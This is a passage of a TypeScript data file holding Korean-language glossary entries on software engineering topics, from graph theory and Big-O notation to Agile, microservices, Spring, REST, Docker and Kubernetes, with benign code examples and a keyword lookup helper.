    example: '그래프 용어:\n- 정점(Vertex): 그래프의 기본 객체\n- 간선(Edge): 정점 간의 연결\n- 인접(Adjacent): 간선으로 직접 연결된 정점 관계\n- 경로(Path): 정점을 연결하는 간선의 시퀀스\n- 사이클(Cycle): 시작과 끝이 같은 경로\n\n그래프 표현 방법:\n- 인접 행렬(Adjacency Matrix): V×V 크기의 2D 배열 (공간: O(V²))\n- 인접 리스트(Adjacency List): 각 정점의 인접 정점 목록 (공간: O(V+E))\n- 간선 리스트(Edge List): 모든 간선의 목록\n\n그래프 유형:\n- 방향/무방향 그래프: 간선의 방향성 유무\n- 가중/비가중 그래프: 간선의 가중치 유무\n- 연결/비연결 그래프: 모든 정점 쌍 간 경로 존재 여부\n- 사이클릭/비순환 그래프: 사이클 존재 여부\n- 완전 그래프: 모든 정점 쌍이 간선으로 연결됨\n\n그래프 알고리즘:\n- DFS(깊이 우선 탐색): 가능한 깊게 탐색 후 백트래킹\n- BFS(너비 우선 탐색): 현재 깊이의 모든 정점 방문 후 다음 깊이로\n- 최단 경로: 다익스트라, 벨만-포드, 플로이드-와샬\n- 최소 신장 트리: 프림, 크루스칼\n- 위상 정렬: 방향성 비순환 그래프의 선형 순서화',
    relatedKeywords: ['DFS', 'BFS', '최단경로', '최소신장트리', '위상정렬', '인접 행렬', '인접 리스트']
  },
  {
    keyword: '시간복잡도',
    description: '시간복잡도(Time Complexity)는 알고리즘이 실행되는 데 필요한 시간을 표현하는 방법으로, 입력 크기에 따른 연산 횟수의 증가율을 나타냅니다. 빅오(Big-O) 표기법을 주로 사용하여 알고리즘의 효율성을 분석합니다.',
    example: '빅오 표기법과 증가 순서:\n- O(1): 상수 시간 (배열 인덱싱, 해시 테이블 조회)\n- O(log n): 로그 시간 (이진 탐색, 균형 이진 트리)\n- O(n): 선형 시간 (배열 순회, 선형 탐색)\n- O(n log n): 선형 로그 시간 (병합 정렬, 퀵 정렬(평균))\n- O(n²): 제곱 시간 (버블 정렬, 삽입 정렬)\n- O(n³): 세제곱 시간 (단순 행렬 곱셈)\n- O(2ⁿ): 지수 시간 (하노이 탑, 부분집합 생성)\n- O(n!): 팩토리얼 시간 (순열 생성, 외판원 문제의 단순 접근)\n\n알고리즘 효율성 예시:\n- 정렬 알고리즘:\n  * 퀵 정렬: 평균 O(n log n), 최악 O(n²)\n  * 병합 정렬: O(n log n)\n  * 버블 정렬: O(n²)\n- 탐색 알고리즘:\n  * 선형 탐색: O(n)\n  * 이진 탐색: O(log n)\n\n분석 시 고려사항:\n- 최선/평균/최악의 경우\n- 입력 데이터의 분포 및 초기 상태\n- 상수 인자(작은 n에서 중요할 수 있음)',
    relatedKeywords: ['알고리즘 효율성', '빅오 표기법', '공간복잡도', '최선/평균/최악 케이스', '점근적 분석']
  },
  {
    keyword: '빅오 표기법',
    description: '빅오 표기법(Big-O Notation)은 알고리즘의 시간 복잡도를 표현하는 방법으로, 입력 크기에 따른 연산 횟수의 증가율을 나타냅니다. 최악의 경우(worst case)를 기준으로 표현하여 알고리즘의 효율성을 분석합니다.',
    example: '',
    relatedKeywords: []
  },
  {
    keyword: '애자일/스크럼',
    description: '애자일(Agile)은 반복적인 개발 주기와 지속적인 피드백을 통해 유연하게 변화에 대응하는 소프트웨어 개발 방법론입니다. 스크럼(Scrum)은 애자일 방법론의 대표적인 프레임워크로, 짧은 반복 주기(스프린트)와 명확한 역할을 통해 팀의 자기 조직화를 강조합니다.',
    example: '애자일 핵심 가치(애자일 선언문):\n- 프로세스와 도구보다 개인과 상호작용\n- 포괄적인 문서보다 작동하는 소프트웨어\n- 계약 협상보다 고객과의 협력\n- 계획을 따르기보다 변화에 대응\n\n스크럼 프레임워크 요소:\n1. 역할\n   - 제품 책임자(Product Owner): 제품 백로그 관리, 우선순위 설정\n   - 스크럼 마스터(Scrum Master): 프로세스 촉진, 장애물 제거\n   - 개발 팀(Development Team): 제품 개발 수행\n\n2. 이벤트\n   - 스프린트(Sprint): 2-4주 단위의 개발 주기\n   - 스프린트 계획(Sprint Planning): 스프린트 목표와 작업 계획\n   - 일일 스크럼(Daily Scrum): 15분 간의 팀 동기화 미팅\n   - 스프린트 리뷰(Sprint Review): 구현된 기능 검토\n   - 스프린트 회고(Sprint Retrospective): 프로세스 개선 논의\n\n3. 산출물\n   - 제품 백로그(Product Backlog): 제품 기능 요구사항 목록\n   - 스프린트 백로그(Sprint Backlog): 선택된 작업 항목\n   - 제품 증분(Product Increment): 스프린트에서 완성된 기능',
    relatedKeywords: ['스프린트', '백로그', '스크럼 마스터', '제품 책임자', '애자일 선언문', '스크럼 이벤트', '번다운 차트']
  },
  {
    keyword: '폭포수 모델',
    description: '폭포수 모델(Waterfall Model)은 소프트웨어 개발 프로세스를 순차적인 단계로 진행하는 전통적인 개발 방법론입니다. 각 단계가 이전 단계의 완료에 의존하며, 명확한 문서화를 중요시합니다.',
    example: '폭포수 모델의 단계:\n1. 요구사항 분석(Requirements): 시스템 요구사항을 수집하고 문서화\n2. 설계(Design): 시스템 아키텍처 및 상세 설계 수행\n3. 구현(Implementation): 설계 문서를 바탕으로 코드 작성\n4. 검증(Verification): 시스템 테스트 및 디버깅\n5. 유지보수(Maintenance): 시스템 개선 및 오류 수정\n\n특징:\n- 각 단계는 명확히 정의되고 문서화됨\n- 이전 단계가 완료된 후 다음 단계로 진행\n- 요구사항이 초기에 명확하고 변경이 적은 프로젝트에 적합\n- 프로젝트 진행 상황을 쉽게 관리하고 측정 가능',
    relatedKeywords: ['소프트웨어 개발 생명주기', '애자일', '프로토타입 모델', 'V 모델', '반복적 개발 모델']
  },
  {
    keyword: '서비스 지향 아키텍처',
    description: '서비스 지향 아키텍처(SOA, Service-Oriented Architecture)는 비즈니스 프로세스를 독립적이고 표준화된 서비스 단위로 분리하여 구성하는 소프트웨어 아키텍처 스타일입니다. 각 서비스는 독립적으로 배포 가능하며, 표준화된 인터페이스를 통해 통신합니다.',
    example: 'SOA 주요 원칙:\n1. 표준화된 서비스 계약(Service Contract): 서비스는 명확한 인터페이스 정의\n2. 느슨한 결합(Loose Coupling): 서비스 간 의존성 최소화\n3. 추상화(Abstraction): 서비스 내부 구현 은닉\n4. 재사용성(Reusability): 여러 비즈니스 프로세스에서 서비스 재활용\n5. 자율성(Autonomy): 서비스는 자체적으로 제어 가능\n6. 무상태(Statelessness): 서비스는 상태 정보를 최소화\n\nSOA 구성요소:\n- 서비스 제공자(Service Provider): 서비스 구현 및 제공\n- 서비스 소비자(Service Consumer): 서비스 사용\n- 서비스 레지스트리(Service Registry): 서비스 목록 관리\n- 서비스 버스(ESB): 서비스 간 통신 중재\n\n구현 기술:\n- SOAP(Simple Object Access Protocol)\n- WSDL(Web Services Description Language)\n- REST(Representational State Transfer)\n- XML/JSON 메시지 형식',
    relatedKeywords: ['마이크로서비스', 'ESB', 'SOAP', 'REST', 'API', '웹서비스', 'WSDL']
  },
  {
    keyword: '마이크로서비스',
    description: '마이크로서비스(Microservices)는 애플리케이션을 독립적으로 개발, 배포, 확장할 수 있는 작은 서비스들의 집합으로 구성하는 아키텍처 스타일입니다. 각 서비스는 특정 비즈니스 기능에 집중하며, 독립적인 프로세스로 실행됩니다.',
    example: '마이크로서비스 특징:\n1. 서비스 분리: 각 서비스는 특정 비즈니스 기능에 집중\n2. 자율성: 각 팀이 서비스의 전체 생명주기 담당\n3. 분산 데이터 관리: 각 서비스는 자체 데이터 저장소 보유\n4. 인프라 자동화: CI/CD, 컨테이너화, 오케스트레이션 활용\n5. 장애 격리: 한 서비스 장애가 전체 시스템에 영향 최소화\n\n구현 패턴:\n- API 게이트웨이: 클라이언트 요청 라우팅 및 조합\n- 서비스 디스커버리: 동적으로 서비스 위치 파악\n- 서킷 브레이커: 장애 확산 방지\n- CQRS: 명령과 조회 책임 분리\n- 이벤트 소싱: 상태 변경을 이벤트로 저장\n\n기술 스택 예시:\n- 컨테이너: Docker, Kubernetes\n- 서비스 디스커버리: Eureka, Consul\n- API 게이트웨이: Spring Cloud Gateway, Kong\n- 메시징: Kafka, RabbitMQ\n- 모니터링: Prometheus, Grafana',
    relatedKeywords: ['서비스 지향 아키텍처', 'API 게이트웨이', '컨테이너화', '서비스 메시', 'DevOps', '도커', '쿠버네티스']
  },
  {
    keyword: '클라우드 컴퓨팅',
    description: '클라우드 컴퓨팅(Cloud Computing)은 인터넷을 통해 컴퓨팅 리소스(서버, 스토리지, 데이터베이스, 네트워킹, 소프트웨어 등)를 온디맨드로 제공하는 서비스 모델입니다. 사용자는 필요에 따라 리소스를 확장하거나 축소할 수 있습니다.',
    example: '서비스 모델:\n1. IaaS(Infrastructure as a Service): 가상화된 컴퓨팅 인프라 제공\n   - 예: AWS EC2, Azure VM, Google Compute Engine\n2. PaaS(Platform as a Service): 애플리케이션 개발 및 배포 플랫폼 제공\n   - 예: AWS Elastic Beanstalk, Google App Engine, Heroku\n3. SaaS(Software as a Service): 완전한 애플리케이션 제공\n   - 예: Salesforce, Google Workspace, Microsoft 365\n\n배포 모델:\n- 퍼블릭 클라우드: 서비스 제공업체가 관리하는 공용 인프라\n- 프라이빗 클라우드: 단일 조직을 위해 독점적으로 운영되는 인프라\n- 하이브리드 클라우드: 퍼블릭과 프라이빗 클라우드의 조합\n- 멀티 클라우드: 여러 클라우드 제공업체 활용\n\n클라우드 컴퓨팅 이점:\n- 비용 효율성: 사용한 만큼 지불(Pay-as-you-go)\n- 확장성: 필요에 따라 리소스 확장/축소\n- 유연성: 다양한 서비스 조합 가능\n- 접근성: 인터넷 연결만으로 접근 가능\n- 재해 복구: 지리적 분산을 통한 데이터 보호',
    relatedKeywords: ['IaaS', 'PaaS', 'SaaS', '가상화', '탄력적 컴퓨팅', '서버리스', '컨테이너화', 'AWS', 'Azure', 'GCP']
  },
  {
    keyword: 'CI/CD',
    description: 'CI/CD(지속적 통합/지속적 배포)는 소프트웨어 개발 프로세스를 자동화하여 더 빠르고 안정적으로 코드를 빌드, 테스트, 배포하는 방법론입니다. CI(지속적 통합)는 개발자의 코드 변경사항을 정기적으로 통합하고 검증하며, CD(지속적 배포)는 검증된 코드를 자동으로 프로덕션 환경에 배포합니다.',
    example: 'CI(지속적 통합) 프로세스:\n1. 코드 변경사항을 버전 관리 시스템에 커밋\n2. 자동화된 빌드 시작\n3. 단위 테스트 실행\n4. 정적 코드 분석\n5. 통합 테스트 실행\n6. 결과 보고 및 피드백\n\nCD(지속적 배포) 프로세스:\n1. CI 프로세스 완료 후 시작\n2. 스테이징 환경에 배포\n3. 성능 테스트 및 사용자 수용 테스트\n4. 보안 검사\n5. 프로덕션 환경에 배포\n6. 모니터링 및 롤백 준비\n\nCI/CD 도구:\n- Jenkins: 오픈소스 자동화 서버\n- GitLab CI/CD: GitLab에 통합된 CI/CD 서비스\n- GitHub Actions: GitHub 저장소와 통합된 워크플로우\n- CircleCI: 클라우드 기반 CI/CD 플랫폼\n- Travis CI: 클라우드 기반 CI/CD 서비스\n- ArgoCD: 쿠버네티스용 GitOps 지속적 배포 도구\n\nCI/CD 이점:\n- 빠른 피드백 루프: 버그 조기 발견\n- 위험 감소: 작은 변경사항 단위로 배포\n- 생산성 향상: 수동 작업 감소\n- 일관된 배포 프로세스: 인적 오류 최소화',
    relatedKeywords: ['DevOps', '자동화', '파이프라인', 'Jenkins', 'GitOps', '테스트 자동화', '무중단 배포', '롤백', '블루-그린 배포']
  },
  {
    keyword: '서블릿',
    description: '서블릿(Servlet)은 자바 기반의 웹 애플리케이션 개발을 위한 서버 측 프로그래밍 기술입니다. 클라이언트의 요청을 처리하고 동적인 웹 콘텐츠를 생성하는 자바 클래스로, 웹 서버와 자바 애플리케이션 사이의 중개자 역할을 합니다.',
    example: '기본적인 서블릿 구현 예시:\n```java\nimport javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.io.*;\n\npublic class HelloServlet extends HttpServlet {\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n        response.setContentType("text/html");\n        PrintWriter out = response.getWriter();\n        out.println("<html><body>");\n        out.println("<h1>Hello, World!</h1>");\n        out.println("</body></html>");\n    }\n}\n```\n\n서블릿 생명주기:\n1. 초기화: init() 메서드 - 서블릿 인스턴스 생성 시 한 번 호출\n2. 서비스: service() 메서드 - 각 클라이언트 요청마다 호출 (doGet, doPost 등 호출)\n3. 소멸: destroy() 메서드 - 서블릿 종료 전 한 번 호출 (리소스 정리)\n\n서블릿 매핑 (web.xml):\n```xml\n<servlet>\n    <servlet-name>hello</servlet-name>\n    <servlet-class>HelloServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>hello</servlet-name>\n    <url-pattern>/hello</url-pattern>\n</servlet-mapping>\n```',
    relatedKeywords: ['Java EE', '웹 애플리케이션', 'JSP', '톰캣', 'HttpServlet', '서블릿 컨테이너', 'web.xml']
  },
  {
    keyword: 'JSP',
    description: 'JSP(JavaServer Pages)는 HTML 내에 자바 코드를 삽입하여 동적인 웹 페이지를 생성하는 서버 측 기술입니다. 서블릿을 확장한 기술로, HTML 코드 안에 자바 코드를 작성할 수 있어 프레젠테이션 로직 개발이 용이합니다.',
    example: 'JSP 기본 문법 예시:\n```jsp\n<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>\n<!DOCTYPE html>\n<html>\n<head>\n    <title>JSP 예제</title>\n</head>\n<body>\n    <h1>안녕하세요, JSP!</h1>\n    \n    <%-- 선언문 --%>\n    <%! int count = 0; %>\n    \n    <%-- 스크립틀릿 --%>\n    <% \n        count++;\n        String message = "방문 횟수: " + count;\n    %>\n    \n    <%-- 표현식 --%>\n    <p><%= message %></p>\n    \n    <%-- EL(Expression Language) --%>\n    <p>현재 시간: ${java.time.LocalDateTime.now()}</p>\n    \n    <%-- JSTL 사용 예시 --%>\n    <%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>\n    <c:if test="${count > 5}">\n        <p>여러 번 방문해주셔서 감사합니다!</p>\n    </c:if>\n</body>\n</html>\n```\n\nJSP 주요 구성 요소:\n1. 디렉티브(Directive): <%@ ... %> - 페이지 속성 설정\n2. 선언문(Declaration): <%! ... %> - 변수, 메서드 선언\n3. 스크립틀릿(Scriptlet): <% ... %> - 자바 코드 삽입\n4. 표현식(Expression): <%= ... %> - 값 출력\n5. EL(Expression Language): ${...} - 속성 값 출력\n6. 액션 태그: <jsp:...> - JSP 페이지 흐름 제어\n7. JSTL(JSP Standard Tag Library): 조건문, 반복문 등을 태그로 구현\n\nJSP 실행 과정:\n1. JSP 페이지 요청\n2. JSP 페이지가 서블릿 코드로 변환 (첫 요청 시)\n3. 서블릿 컴파일 및 클래스 로딩\n4. 서블릿 실행 및 HTML 응답 생성',
    relatedKeywords: ['서블릿', 'Java EE', '웹 애플리케이션', 'JSTL', 'EL', 'MVC', '톰캣']
  },
  {
    keyword: 'Spring Framework',
    description: 'Spring Framework는 자바 기반의 엔터프라이즈 애플리케이션 개발을 위한 오픈 소스 프레임워크입니다. 의존성 주입(DI)과 제어 역전(IoC)을 핵심으로 하며, 모듈화된 아키텍처를 통해 웹 애플리케이션, 데이터 접근, 보안 등 다양한 기능을 제공합니다.',
    example: 'Spring 핵심 컴포넌트:\n\n1. IoC 컨테이너 예시:\n```java\n// Bean 정의\n@Component\npublic class UserService {\n    private final UserRepository userRepository;\n    \n    // 생성자 주입\n    @Autowired\n    public UserService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n    \n    public User findById(Long id) {\n        return userRepository.findById(id);\n    }\n}\n\n// 애플리케이션 컨텍스트 설정\n@Configuration\n@ComponentScan("com.example")\npublic class AppConfig {\n    // 설정 코드\n}\n```\n\n2. Spring MVC 예시:\n```java\n@Controller\n@RequestMapping("/users")\npublic class UserController {\n    private final UserService userService;\n    \n    public UserController(UserService userService) {\n        this.userService = userService;\n    }\n    \n    @GetMapping("/{id}")\n    public String getUser(@PathVariable Long id, Model model) {\n        User user = userService.findById(id);\n        model.addAttribute("user", user);\n        return "user/detail"; // view 이름\n    }\n    \n    @PostMapping\n    public String createUser(@ModelAttribute UserForm form) {\n        userService.save(form);\n        return "redirect:/users";\n    }\n}\n```\n\n3. Spring Data JPA 예시:\n```java\npublic interface UserRepository extends JpaRepository<User, Long> {\n    List<User> findByLastName(String lastName);\n    \n    @Query("SELECT u FROM User u WHERE u.email = :email")\n    Optional<User> findByEmail(@Param("email") String email);\n}\n```\n\nSpring Boot 애플리케이션 예시:\n```java\n@SpringBootApplication\npublic class MyApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(MyApplication.class, args);\n    }\n}\n```',
    relatedKeywords: ['IoC', 'DI', 'AOP', 'Spring Boot', 'Spring MVC', 'Spring Data', 'Bean', 'Spring Security']
  },
  {
    keyword: 'REST API',
    description: 'REST API(Representational State Transfer API)는 HTTP 프로토콜을 기반으로 하는 웹 서비스 아키텍처 스타일입니다. 자원(Resource)을 URI로 표현하고, HTTP 메서드(GET, POST, PUT, DELETE 등)를 통해 자원에 대한 CRUD 작업을 수행합니다. 상태를 유지하지 않는(Stateless) 특성을 가지며, 클라이언트와 서버 간의 느슨한 결합을 지향합니다.',
    example: 'REST API 설계 원칙:\n1. 자원 식별(Resource Identification): URI를 통해 자원 식별\n   - 좋은 예: /users/123\n   - 나쁜 예: /getUser?id=123\n\n2. HTTP 메서드 활용:\n   - GET: 자원 조회 (읽기 전용)\n   - POST: 새 자원 생성\n   - PUT: 자원 수정 (전체 교체)\n   - PATCH: 자원 부분 수정\n   - DELETE: 자원 삭제\n\n3. 응답 상태 코드 활용:\n   - 200 OK: 요청 성공\n   - 201 Created: 자원 생성 성공\n   - 400 Bad Request: 잘못된 요청\n   - 401 Unauthorized: 인증 필요\n   - 403 Forbidden: 권한 없음\n   - 404 Not Found: 자원 없음\n   - 500 Internal Server Error: 서버 오류\n\nREST API 예시 (사용자 관리):\n\n```\n# 사용자 목록 조회\nGET /api/users\n\n# 특정 사용자 조회\nGET /api/users/123\n\n# 새 사용자 생성\nPOST /api/users\nContent-Type: application/json\n\n{\n  "name": "홍길동",\n  "email": "hong@example.com",\n  "role": "user"\n}\n\n# 사용자 정보 수정\nPUT /api/users/123\nContent-Type: application/json\n\n{\n  "name": "홍길동",\n  "email": "hong@example.com",\n  "role": "admin"\n}\n\n# 사용자 삭제\nDELETE /api/users/123\n```\n\nREST API 응답 예시:\n```json\n{\n  "id": 123,\n  "name": "홍길동",\n  "email": "hong@example.com",\n  "role": "user",\n  "created_at": "2023-01-15T09:30:00Z",\n  "links": [\n    {\n      "rel": "self",\n      "href": "/api/users/123"\n    },\n    {\n      "rel": "posts",\n      "href": "/api/users/123/posts"\n    }\n  ]\n}\n```',
    relatedKeywords: ['HTTP', 'URI', 'CRUD', 'JSON', 'Stateless', 'API', 'HATEOAS', 'Richardson 성숙도 모델']
  },
  {
    keyword: 'Docker',
    description: 'Docker는 애플리케이션을 컨테이너로 패키징하여 개발, 배포, 실행하는 오픈 소스 플랫폼입니다. 컨테이너는 코드, 런타임, 시스템 도구, 라이브러리 등 애플리케이션 실행에 필요한 모든 것을 포함하는 가벼운 실행 환경으로, 어디서나 동일하게 실행될 수 있습니다.',
    example: 'Docker 핵심 개념:\n\n1. Dockerfile 예시 (Node.js 애플리케이션):\n```dockerfile\n# 베이스 이미지 설정\nFROM node:14-alpine\n\n# 작업 디렉토리 설정\nWORKDIR /app\n\n# 의존성 파일 복사 및 설치\nCOPY package*.json ./\nRUN npm install\n\n# 애플리케이션 소스 복사\nCOPY . .\n\n# 애플리케이션 빌드\nRUN npm run build\n\n# 포트 노출\nEXPOSE 3000\n\n# 컨테이너 실행 명령\nCMD ["npm", "start"]\n```\n\n2. Docker 이미지 빌드 및 실행:\n```bash\n# 이미지 빌드\ndocker build -t myapp:1.0 .\n\n# 컨테이너 실행\ndocker run -d -p 3000:3000 --name myapp-container myapp:1.0\n\n# 컨테이너 목록 확인\ndocker ps\n\n# 컨테이너 로그 확인\ndocker logs myapp-container\n\n# 컨테이너 중지 및 삭제\ndocker stop myapp-container\ndocker rm myapp-container\n```\n\n3. Docker Compose 예시 (다중 서비스):\n```yaml\n# docker-compose.yml\nversion: "3"\n\nservices:\n  web:\n    build: ./web\n    ports:\n      - "3000:3000"\n    depends_on:\n      - db\n    environment:\n      - DATABASE_URL=postgres://postgres:password@db:5432/mydb\n\n  db:\n    image: postgres:13\n    volumes:\n      - db-data:/var/lib/postgresql/data\n    environment:\n      - POSTGRES_PASSWORD=password\n      - POSTGRES_DB=mydb\n\nvolumes:\n  db-data:\n```\n\nDocker 주요 이점:\n- 일관된 환경: "내 컴퓨터에서는 작동합니다" 문제 해결\n- 격리: 다른 애플리케이션과 의존성 충돌 방지\n- 효율성: 가상 머신보다 가볍고 빠름\n- 확장성: 손쉬운 스케일 업/다운\n- 버전 관리: 이미지 태그를 통한 버전 관리\n- 재사용성: 이미지를 통한 환경 재사용',
    relatedKeywords: ['컨테이너화', 'Dockerfile', 'Docker Compose', '이미지', '컨테이너', '마이크로서비스', '쿠버네티스', 'DevOps']
  },
  {
    keyword: '쿠버네티스',
    description: '쿠버네티스(Kubernetes)는 컨테이너화된 애플리케이션의 자동 배포, 스케일링, 관리를 위한 오픈 소스 컨테이너 오케스트레이션 플랫폼입니다. Google에서 개발한 이 시스템은 컨테이너 그룹(Pod)을 관리하고, 부하 분산, 자동 복구, 롤링 업데이트 등의 기능을 제공합니다.',
    example: '쿠버네티스 핵심 개념:\n\n1. Pod 정의 예시 (YAML):\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: my-app-pod\n  labels:\n    app: my-app\nspec:\n  containers:\n  - name: my-app-container\n    image: my-app:1.0\n    ports:\n    - containerPort: 8080\n    resources:\n      limits:\n        memory: "256Mi"\n        cpu: "500m"\n```\n\n2. Deployment 정의 예시:\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-app-deployment\n  labels:\n    app: my-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-app\n  template:\n    metadata:\n      labels:\n        app: my-app\n    spec:\n      containers:\n      - name: my-app-container\n        image: my-app:1.0\n        ports:\n        - containerPort: 8080\n```\n\n3. Service 정의 예시:\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: my-app-service\nspec:\n  selector:\n    app: my-app\n  ports:\n  - port: 80\n    targetPort: 8080\n  type: LoadBalancer\n```\n\n쿠버네티스 아키텍처 구성요소:\n1. 마스터 컴포넌트:\n   - API 서버: 쿠버네티스 API 제공\n   - etcd: 클러스터 데이터 저장소\n   - 스케줄러: 파드 배치 결정\n   - 컨트롤러 매니저: 복제, 배포 제어\n\n2. 노드 컴포넌트:\n   - kubelet: 노드의 에이전트\n   - kube-proxy: 네트워크 프록시\n   - 컨테이너 런타임: Docker, containerd 등\n\n쿠버네티스 리소스 유형:\n- Pod: 최소 배포 단위, 하나 이상의 컨테이너 그룹\n- ReplicaSet: Pod 복제본 관리\n- Deployment: 선언적 업데이트 관리\n- Service: 파드 집합에 네트워크 연결성 제공\n- ConfigMap/Secret: 설정 관리\n- PersistentVolume: 데이터 저장\n- Namespace: 클러스터 가상 분할',
    relatedKeywords: ['컨테이너 오케스트레이션', 'Docker', '마이크로서비스', 'Pod', 'Deployment', 'Service', 'kubectl', 'Helm']
  }
];

/**
 * 키워드 이름으로 설명 데이터 찾기 헬퍼 함수
 * 
 * @param keyword 찾고자 하는 키워드 이름
 * @returns 해당 키워드의 설명 데이터 또는 기본 설명 객체
 */
export const findKeywordDescription = (keyword: string): KeywordDescription => {
  return KEYWORD_DESCRIPTIONS.find(desc => desc.keyword === keyword) || {
    keyword,
    description: `${keyword}에 대한 상세 설명은 현재 준비 중입니다.`,
    relatedKeywords: []
  };
}; 